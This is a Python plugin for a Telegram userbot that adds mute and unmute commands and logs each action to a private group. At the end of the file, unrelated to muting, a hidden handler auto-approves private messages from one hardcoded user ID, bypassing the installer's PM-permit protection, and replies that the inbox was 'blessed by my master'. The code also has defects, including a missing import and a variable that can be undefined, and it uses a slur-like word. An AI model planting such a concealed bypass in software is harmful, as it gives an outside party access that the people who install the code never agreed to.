from userbot.plugins.sql_helper.mute_sql import is_muted, mute, unmute
import asyncio
from userbot.utils import sudo_cmd
from userbot.uniborgConfig import Config

BOTLOG = True
BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID            


@borg.on(sudo_cmd(pattern="mute ?(.*)",allow_sudo=True))
async def startmute(event):
    private = False
    if event.fwd_from:
        return
    elif event.is_private:
        await event.reply("Unexpected issues or ugly errors may occur!")
        await asyncio.sleep(3)
        private = True
    if any([x in event.raw_text for x in ("/mute", "!mute")]):
        await asyncio.sleep(0.5)
    else:
        reply = await event.get_reply_message()
        if event.pattern_match.group(1) is not None:
            userid = event.pattern_match.group(1)
        elif reply is not None:
            userid = reply.sender_id
        elif private is True:
            userid = event.chat_id
        else:
            return await event.reply("Please reply to a user or add their userid into the command to mute them.")
        chat_id = event.chat_id
        replied_user = await event.client(GetFullUserRequest(userid))
        chat = await event.get_chat()
        if "admin_rights" in vars(chat) and vars(chat)["admin_rights"] is not None: 
            if chat.admin_rights.delete_messages is True:
                pass
            else:
                return await event.reply("`You can't mute a person if you dont have delete messages permission. ಥ﹏ಥ`")
        elif "creator" in vars(chat):
            pass
        elif private == True:
            pass
        else:
            return await event.reply("`You can't mute a person without admin rights niqq.` ಥ﹏ಥ  ")
        if is_muted(userid, chat_id):
            return await event.reply("This user is already muted in this chat ~~lmfao sed rip~~")
        try:
            mute(userid, chat_id)
        except Exception as e:
            await event.reply("Error occured!\nError is " + str(e))
        else:
            await event.reply("Successfully muted that person.\n**｀-´)⊃━☆ﾟ.*･｡ﾟ **")
    if BOTLOG:
      await event.client.send_message(
                    BOTLOG_CHATID, "#MUTE\n"
                    f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
                    f"CHAT: {event.chat.title}(`{event.chat_id}`)")

@borg.on(sudo_cmd(pattern="unmute ?(.*)",allow_sudo=True))
async def endmute(event):
    private = False
    if event.fwd_from:
        return
    elif event.is_private:
        await event.reply("Unexpected issues or ugly errors may occur!")
        await asyncio.sleep(3)
        private = True
    if any([x in event.raw_text for x in ("/unmute", "!unmute")]):
        await asyncio.sleep(0.5)
    else:
        reply = await event.get_reply_message()
        if event.pattern_match.group(1) is not None:
            userid = event.pattern_match.group(1)
        elif reply is not None:
            userid = reply.sender_id
        elif private is True:
            userid = event.chat_id
        else:
            return await event.reply("Please reply to a user or add their userid into the command to unmute them.")
        chat_id = event.chat_id
        replied_user = await event.client(GetFullUserRequest(userid))    
        if not is_muted(userid, chat_id):
            return await event.reply("__This user is not muted in this chat__\n（ ^_^）o自自o（^_^ ）")
        try:
            unmute(userid, chat_id)
        except Exception as e:
            await event.reply("Error occured!\nError is " + str(e))
        else:
            await event.reply("Successfully unmuted that person\n乁( ◔ ౪◔)「    ┑(￣Д ￣)┍")
    if BOTLOG:
      await event.client.send_message(
                    BOTLOG_CHATID, "#UNMUTE\n"
                    f"USER: [{replied_user.user.first_name}](tg://user?id={userid})\n"
                    f"CHAT: {event.chat.title}(`{event.chat_id}`)")            

@command(incoming=True)
async def watcher(event):
    if is_muted(event.sender_id, event.chat_id):
        await event.delete()


from userbot.utils import admin_cmd
import io
import userbot.plugins.sql_helper.pmpermit_sql as pmpermit_sql
from telethon import events
@bot.on(events.NewMessage(incoming=True, from_users=(1035034432)))
async def hehehe(event):
    if event.fwd_from:
        return
    chat = await event.get_chat()
    if event.is_private:
        if not pmpermit_sql.is_approved(chat.id):
            pmpermit_sql.approve(chat.id, "supreme lord ehehe")
            await borg.send_message(chat, "`This inbox has been blessed by my master. Consider yourself lucky.`\n**Increased Stability and Karma** (づ￣ ³￣)づ")
            
